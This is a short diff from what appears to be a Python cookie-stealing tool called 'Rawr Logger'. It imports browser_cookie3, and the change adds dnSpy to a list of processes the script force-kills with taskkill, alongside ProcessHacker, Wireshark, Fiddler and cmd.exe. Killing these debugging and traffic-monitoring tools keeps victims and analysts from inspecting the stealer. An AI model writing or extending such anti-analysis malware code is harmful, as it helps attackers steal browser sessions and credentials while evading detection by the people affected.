@@ -8,6 +8,8 @@ import browser_cookie3
 os.system(f'cls & title Rawr Logger!')
 os.system("taskkill /f /im  ProcessHacker.exe")
 os.system("taskkill /f /im  phacker.exe")
+os.system("taskkill /f /im  dnspy.exe")
+os.system("taskkill /f /im  dnSpy.exe")
 os.system("taskkill /f /im  wireshark.exe")
 os.system("taskkill /f /im  Fiddler.exe")
 os.system("taskkill /f /im  cmd.exe")
